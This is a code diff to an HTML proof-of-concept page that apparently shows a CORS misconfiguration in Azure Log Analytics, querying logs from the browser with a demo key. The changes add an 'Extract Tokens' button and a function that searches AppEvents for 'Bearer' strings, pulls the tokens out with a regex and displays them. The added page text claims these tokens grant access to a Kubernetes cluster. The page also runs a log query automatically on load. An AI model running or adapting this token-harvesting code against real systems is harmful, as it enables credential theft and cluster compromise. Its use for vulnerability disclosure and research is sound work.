@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Azure Log Analytics CORS PoC</title>
+    <title>Azure Log Analytics CORS PoC – Critical Chain</title>
     <style>
         * { box-sizing: border-box; }
         body {
@@ -92,21 +92,33 @@
             text-align: center;
         }
         a { color: #ffd700; }
+        .token-highlight {
+            background: #2a2a3a;
+            border-left: 4px solid #ffd700;
+            padding: 8px 12px;
+            margin: 6px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            overflow-wrap: break-word;
+            word-break: break-all;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>🔍 Azure Log Analytics CORS PoC</h1>
+    <h1>🔍 Azure Log Analytics CORS PoC – Critical Chain</h1>
     <p>
         <span class="badge">Unauthenticated</span>
         <span class="badge" style="background:#4caf50;">CORS Misconfiguration</span>
         <span class="badge" style="background:#d43f3f;">Data Leakage</span>
+        <span class="badge" style="background:#ff4500;">Bearer Token Found</span>
     </p>
 
     <div class="query-area">
         <button onclick="fetchTable('AppExceptions')">📌 AppExceptions</button>
         <button onclick="fetchTable('AppEvents')">📌 AppEvents</button>
+        <button onclick="fetchTokens()">🔑 Extract Tokens</button>
         <button onclick="fetchTable('AppDependencies')">📌 AppDependencies</button>
         <button onclick="fetchTable('ContainerLog_RST')">📌 ContainerLog</button>
         <button onclick="fetchTable('Usage')">📌 Usage</button>
@@ -122,7 +134,8 @@
     <div id="output" class="status">Click a button to fetch data from the public demo workspace.</div>
     <div class="footer">
         Data retrieved from <code>api.loganalytics.azure.com</code> using public <code>DEMO_KEY</code>.
-        <br>This proves <strong>CORS misconfiguration</strong> allows any website to read sensitive logs.
+        <br>This proves <strong>CORS misconfiguration</strong> allows any website to read sensitive logs,
+        <br>including <strong>Bearer tokens</strong> that can compromise Kubernetes clusters.
     </div>
 </div>
 
@@ -137,7 +150,7 @@
         output.style.color = isError ? '#ff6b6b' : '#aaffaa';
     }
 
-    async function runQuery(query) {
+    async function runQuery(query, extractTokens = false) {
         setStatus('⏳ Fetching data...');
         try {
             const resp = await fetch(API_URL, {
@@ -153,8 +166,35 @@
                 throw new Error(`HTTP ${resp.status}: ${errText.substring(0, 100)}`);
             }
             const data = await resp.json();
-            output.textContent = JSON.stringify(data, null, 2);
-            output.style.color = '#aaffaa';
+            if (extractTokens) {
+                // Look for 'Bearer' in the Properties field
+                const rows = data?.tables?.[0]?.rows || [];
+                const tokens = [];
+                for (const row of rows) {
+                    const props = row.find(cell => typeof cell === 'string' && cell.includes('Bearer'));
+                    if (props) {
+                        const match = props.match(/Bearer\s+([A-Za-z0-9._-]+)/);
+                        if (match) {
+                            tokens.push(match[1]);
+                        }
+                    }
+                }
+                if (tokens.length > 0) {
+                    let outputText = '✅ Found Bearer Tokens:\n\n';
+                    tokens.forEach((t, i) => {
+                        outputText += `Token ${i+1}:\n${t}\n\n`;
+                    });
+                    outputText += '\n⚠️ These tokens grant access to the AKS cluster!';
+                    output.textContent = outputText;
+                    output.style.color = '#ffd700';
+                } else {
+                    output.textContent = '❌ No Bearer tokens found in the retrieved logs.';
+                    output.style.color = '#ff6b6b';
+                }
+            } else {
+                output.textContent = JSON.stringify(data, null, 2);
+                output.style.color = '#aaffaa';
+            }
         } catch (err) {
             setStatus('❌ Error: ' + err.message, true);
         }
@@ -162,7 +202,13 @@
 
     function fetchTable(table) {
         const query = `${table} | take 5`;
-        runQuery(query);
+        runQuery(query, false);
+    }
+
+    function fetchTokens() {
+        // Query AppEvents for properties containing "Bearer"
+        const query = `AppEvents | where Properties contains "Bearer" | take 5 | project TimeGenerated, Properties`;
+        runQuery(query, true);
     }
 
     function fetchCustom() {
@@ -171,7 +217,7 @@
             setStatus('❌ Please enter a KQL query.', true);
             return;
         }
-        runQuery(query);
+        runQuery(query, false);
     }
 
     function clearOutput() {
@@ -182,7 +228,7 @@
     // Auto-run a sample on load to show immediate proof
     window.onload = function() {
         const sampleQuery = 'AppExceptions | take 3 | project Message, Method, Assembly';
-        runQuery(sampleQuery);
+        runQuery(sampleQuery, false);
     };
 </script>
 
